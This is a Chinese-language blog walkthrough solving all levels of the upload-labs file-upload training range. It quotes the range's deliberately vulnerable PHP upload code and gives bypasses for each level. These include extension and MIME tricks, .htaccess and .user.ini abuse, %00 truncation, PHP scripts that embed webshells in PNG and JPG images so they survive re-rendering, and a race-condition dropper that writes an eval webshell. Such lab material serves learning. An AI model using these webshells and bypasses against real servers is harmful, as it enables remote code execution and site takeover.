---
title: upload-labs文件上传靶场全通关
date: 2024-07-18 20:34:27
tags: 渗透测试
categories: [渗透测试,基本漏洞,文件上传]
title: "upload-labs文件上传靶场全通关"
description: "sql-labs文件上传靶场通关"
date: "2024-07-18"
author: "y0un92"
tags: ["渗透测试", "React", "前端", "Web开发"]
published: true
---

### 一、环境搭建

从GitHub上面直接下载源码[upload-labs](https://github.com/c0ny1/upload-labs)，用phpstudy搭建靶场，将下载解压后的文件放到WWW文件目录下即可，如出现一下界面即为搭建成功

![](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407182047505.png)

### 二、靶场实战

#### **pass-01**（前端绕过）

直接上传一个一句话木马shell.php试试，发现一个弹窗，只允许上传jpg、png、gif类型的文件。

![](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407182049287.png)

很显然，这是一个js前端验证，即在前端界面就限制了上传文件的类型，上传的文件甚至都没有到后端的数据库，所以更别谈解析了。解决方法也很简单，直接关闭浏览器的前端验证就行。这里以火狐浏览器为例，在搜索栏输入`about:config`，发现如下界面，搜索`javascript`，找到`javascript.enabled`关闭就行

![](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407182057192.png)

再次上传shell.php发现上传成功

![](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407182100249.png)

之后直接用蚁剑连接就行了

#### pass-02（MIME验证）

上传shell.php，这次没有前端弹窗，直接显示了上传文件类型不正确，查看源码

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}
```

发现是**MIME(Multipurpose Internet Mail Extensions )**验证，事实上对文件的后缀名并没有验证，只需用burpsuite进行抓包修改`content-type`字段就行

![](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407182200860.png)

之后直接用蚁剑连接就行了

#### pass-03（特殊后缀绕过）

直接分析源代码

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

不难看出，这关是一个黑名单过滤，不许上传.asp、.aspx、.php、.jsp后缀的文件，黑名单绕过相对比白名单简单一些的，毕竟，列举出所有可能的文件后缀还是有点难度的，漏掉一个都可能导致上传木马成功，这关过滤的后缀名比较少，尝试其它等效的php后缀名，例如php3，php5，phtml等等

![](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407191703193.png)

此关注意要将配置文件改成`AddTypeapplication/x-httpd-php .php .phtml .php5 .php3`

这段代码的意思是将.php .phtml .php5 .php3的文件当作php文件解析，之后用蚁剑连接就行

#### pass-04（.htaccess文件）

本关引入一个新的文件：**.htaccess文件**

**.htaccess**文件时Apache服务中的一个配置文件，它负责相关目录下的网页配置。通过**.htaccess**文件，可以帮助我们实现：网页301重定向、自定义404错误页面，改变文件扩展名、允许/阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能。

这样我们就可以通过**.htaccess**文件将.jpg文件解析为.php文件，创建**.htaccess**文件如下

```
<FilesMatch "\.jpg">
  SetHandler application/x-httpd-php
</FilesMatch>
```

该文件的意思是将所有./jpg后缀的文件解析为php文件

查看源码

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

发现又是黑名单过滤，不过这次过滤了一长串，第三问提出的其他后缀名也都被过滤掉了，所以可以尝试上传**.htaccess**文件之后，在上传一个.jpg后缀的一句话木马，之后用蚁剑连接就行了

#### pass-05（.user.ini）

查看源码发现把第四关的.htaccess文件过滤掉了，所以必须另寻他法。发现有**.user.ini**文件

```
user.ini ： 自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用.htaccess 文件有同样效果。

除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web根目录（$_SERVER['DOCUMENT_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。

在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI设置可被识别。两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。 user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。 user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。
```

**php.ini** 是 php的配置文件，**.user.ini** 中的字段也会被 php 视为配置文件来处理，从而导致 php 的文件解析漏洞。

但是想要引发 .user.ini 解析漏洞需要三个前提条件：

1、服务器脚本语言为PHP  

2、服务器使用CGI／FastCGI模式  

3、上传目录下要有可执行的php文件

编写**.user.ini**文件如下

```
auto_prepend_file=shell.jpg
```

接着上传一句话木马shell.jpg，此时直接用用蚁剑连接返回值是为空的，查看提示知道还有一个**readme.php**，连接这个php文件就可以连接成功了

#### pass-06（大写绕过）

查看源码发现把第五关的.ini后缀过滤了，对比之前的源码，发现少了

```php
$file_ext = strtolower($file_ext); //转换为小写
```

于是我们可以尝试用大写绕过，上传**shell.Php**，用蚁剑连接就行了

#### pass-07（空格绕过）

对比之前的源码发现没有

```php
$file_name = trim($_FILES['upload_file']['name']);
```

该行代码是将上传文件最后的空格去掉，于是本关尝试用空格绕过，由于windows会自动将文件名最后的空格去掉，所以用burpsuite抓包修改文件名在最后面加上一个空格发现上传成功，之后用蚁剑连接就行了

![](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407201340478.png)

#### pass-08（点绕过）

查看源码发现少了

```php
 $file_name = deldot($file_name);//删除文件名末尾的点
```

于是我们可以尝试用点绕过，即上传`shell.php.`，发现上传成功并解析成功，直接用蚁剑连接

#### pass-09（::DATA绕过）

查看源码发现少了

```php
$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
```

于是可以尝试用`::$DATA`来绕过，用bp抓包并在后缀名后面加上`::$DATA`

![](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407212358757.png)

上传成功，蚁剑连接的时候注意要把后面的`::$DATA`去掉再连接

#### pass-10（点加空格绕过）

查看源码发现前面的关卡的绕过姿势都被ban了，只能另寻他路，发现`deldot`函数有个特性，其检查点是从右往左检查点，但是遇到空格会停下来，于是不难想到我们可以通过`. .`来绕过，即上传`shell.php. .`来绕过

![](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407220011997.png)

接下来用蚁剑连接即可

#### pass-11（双写绕过）

查看源码可知

```php
$deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess","ini");
$file_name = str_ireplace($deny_ext,"", $file_name);
```

采用str_ireplace函数来替换掉文件名包含的黑名单后缀名，将其值替换为空字符串，于是可以尝试双写绕过
既可以上传`shell.pphphp`，由于这个函数只进行一次，故会将pphphp中间的php去掉，后缀名就变为了php

![image-20240722003221113](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407220032308.png)

![image-20240722003454419](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407220034488.png)

发现上传的图片的文件名确实变成了`shell.php`，用蚁剑连接即可

#### pass-12（GET %00截断）

**ps：本关复现条件：**

**1、php版本小于5.3.29**

**2、magic_quotes_gpc = Off**

查看源码

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

发现此关限制了上传的文件名后缀只能为`'jpg','png','gif'`，故为白名单过滤。同时还给了一个`save_path`参数需要我们进行GET传参，即上传路径可控。最终文件的存放位置是以拼接的方式，可以使用%00截断。原理：php的一些函数的底层是C语言，而`move_uploaded_file`就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。

![image-20240722010252303](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407220102415.png)

由于我的phpstudy的原因（php版本过高）而不能复现，故只讲解法。上传shell.php文件，在`/upload/`后面接上`shell.php%00`，并将上传的文件名改为shell.jpg，这样拼接时遇到`%00`就会截断，事实上只解析了shell.php而没有后面一部分，故蚁剑连接的时候也只用输入到shell.php即可

#### pass-13（POST 0x00截断）

PHP环境要求同**pass-12**，与上一关不同的点就在于此关是post传参控制上传路径，解题方法类似

![1721618379467](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407221120341.png)

注意shell.php后面是有一个%00的，由于在post传参里面，需要进行URL decode，bp里面进行URL decode只需选中要解码的内容，右键选择`Convert selection`------`URL`------`URL-decode`，用蚁剑连接的时候只需把文件名写到shell.php就行了

#### pass-14（图片码）

本关要求上传图片码，图片码制作如下

**Linux：**

```shell
cat shell.php >> shell.jpg
```

**shell.php**是一句话木马，**shell.jpg**是正常的图片，执行后`cat shell.jpg`查看**shell.jpg**可以发现一句话木马写到了图片后面

**windows:**

```cmd
copy 1.jpg/b + 1.php/a 2.jpg  
```

**1.jpg**是正常图片，**1.php**是一句话木马，**2.jpg**是制作的图片码
制作完成之后就可以直接上传了

上传之后，可以通过GET传参搭配文件包含漏洞来测试是否上传成功



#### pass-15

本关同**pass-14**

#### pass-16

本关同**pass-14**和**pass-15**，但是需要打开php_exif

#### pass-17（二次渲染）

**二次渲染原理：**
在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。

**二次渲染绕过：**

1. 配合文件包含漏洞：
   将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取webshell。
2. 配合条件竞争：
   这里二次渲染的逻辑存在漏洞，先将文件上传，之后再判断，符合就保存，不符合删除，可利用条件竞争来进行爆破上传。

这里先介绍结合文件包含漏洞绕过，包括**gif**文件、**jpg**文件、**png**文件绕过

##### GIF文件绕过

先制作gif图片码，上传到靶场

![image-20240724180939189](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407241809406.png)

右键图片，新页面查看并另存到电脑里面，打开`010editor`工具打开下载的图片和图片码比较哪部分没有改变(顶部选择工具---比较文件)
![image-20240724181208300](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407241812614.png)

选中匹配，十六进制中蓝色部分即为匹配的地方，也就是二次渲染没有进行更新的地方，我们在这里插入一句话木马，并保存图片。重复上面的操作，上传之后再下载对比看看木马是否还存在。
![image-20240724191735308](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407241917642.png)

木马还在，接着结合文件包含漏洞用蚁剑连接即可

##### PNG文件绕过

尝试和gif一样的手法绕过，对比下来发现只有png文件头是一样的，如果修改这一部分则会导致文件不是png文件，所以要另寻他法。
先介绍一下相关知识：

**png图片格式组成**：

png图片由3个以上的数据块组成.

png定义了两种类型的数据块，一种是称为**关键数据块(critical chunk)**，这是标准的数据块，另一种叫做**辅助数据块(ancillary chunks)**，这是可选的数据块。
关键数据块定义了3个标准数据块**(IHDR,IDAT, IEND)**，每个PNG文件都必须包含它们：

**IHDR**

数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。

**PLTE**

调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。

**IDAT**

图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像

**IEND**

图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。

如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：

00 00 00 00 49 45 4E 44 AE 42 60 82

有两种方法写入php代码：

###### 1、写入PLTE模块

写入 PLTE 数据块并不是对所有的 PNG 图片都是可行的，只有索引图像才可以成功插入 payload。附上payload图片：
![webshell](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407242145860.png)

蚁剑的连接密码为1

###### 2、写入IDAT模块

运行php脚本如下：

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');
?>
```

使用方法：

```
php IDAT_PNG.php shell.png
```

`IDAT_PNG.php`是脚本名称，`shell.png`是一张png后缀的图片，运行后会生成一个`1.png`的文件，用`010editor`查看
![image-20240725104741788](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407251047952.png)

发现木马已经被写入，对0进行GET传参，对1进行POST传参。例如GET:?0=system POST:1=whoami，用hackbar传参
![image-20240725111629082](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407251116318.png)

发现命令执行成功

##### JPG文件绕过

直接上脚本

```php
<?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php <jpg_name.jpg>

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs "Something's wrong".
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */

    $miniPayload = "<?=phpinfo();?>";


    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }

    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
```

使用方法：先上传一张jpg图片到靶场，再下载渲染后的照片命名为`1.jpg`，运行

```shell
php jpg_payload.php 1.jpg
```

就可以得到payload的jpg图片了，但是需要多次尝试，因为有的jpg图片不能被修改

#### pass-18（条件竞争）

**条件竞争原理：**

条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。

上传文件源代码里没有校验上传的文件，文件直接上传，上传成功后才进行判断：如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除。
由于服务器并发处理(同时)多个请求，假如a用户上传了木马文件，由于代码执行需要时间，在此过程中b用户访问了a用户上传的文件，会有以下三种情况：
  1.访问时间点在上传成功之前，没有此文件。
  2.访问时间点在刚上传成功但还没有进行判断，该文件存在。
  3.访问时间点在判断之后，文件被删除，没有此文件。
**条件竞争绕过：**

修改木马如下：

```php
<?php fputs(fopen('a.php','w'),'<?php @eval($_POST["a"])?>');?>
```

这个木马会生成在后台生成一个一句话木马`a.php`，接下来我们要并发的去访问这个文件，需要用bp一直去发包，然后利用python脚本去监听是否访问到了该文件。bp发包如下：

先抓包，然后右键送到`Intruder`模块，然后`clear $`
![image-20240725221743994](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407252217368.png)

选择**payload type**为`Null payloads`，同时将**payload setting**选为`continue indefinitely`
接着运行python脚本，xxx表示自己的靶场地址

```python
import requests
url = "http://xxx.xxx.xxx.xx/upload-labs/upload/shell.php"
while True:
    html = requests.get(url)
    if ( 'Warning'  not in  str(html.text)):
        print('ok')
        break
```

等到输出ok的时候就可以访问，用蚁剑连接的时候访问a.php就行了
**ps：**条件竞争可能不成功，需要多试几次

#### pass-19（条件竞争）

此关和**pass-18**类似，只不过本关需要上传的是图片码而非木马，故先制作图片码，**shell.php**使用**pass-18**的木马即可。其余和**pass-18**

相仿，不再赘述。

#### pass-20（/.绕过）

本关上传文件名可控，由于`move_uploaded_file()`有一个特性，会忽略掉文件末尾的 `/.`所以直接在保存文件名称的时候在最后加上`/.`
![image-20240727231610216](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407272316362.png)

连接的时候用`upload-19.php`就行

#### pass-21（数组绕过）

本关包含了后缀名验证、**MIME**验证以及数组绕过
![image-20240727233907354](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407272339502.png)

原理我也没搞太懂，先记录下来

### 三、总结

文件上传分为两大类：**前端验证**和**后端验证**。
**前端验证**的安全性远远低于**后端验证**，而后端验证又分为**白名单**和**黑名单**，**白名单**的安全性大于**黑名单**，下图为文件上传思维导图

![image-20240727234236167](https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407272342961.png)

自己写代码的时候注意多使用白名单过滤，以免留多的后门。

**完结撒花**
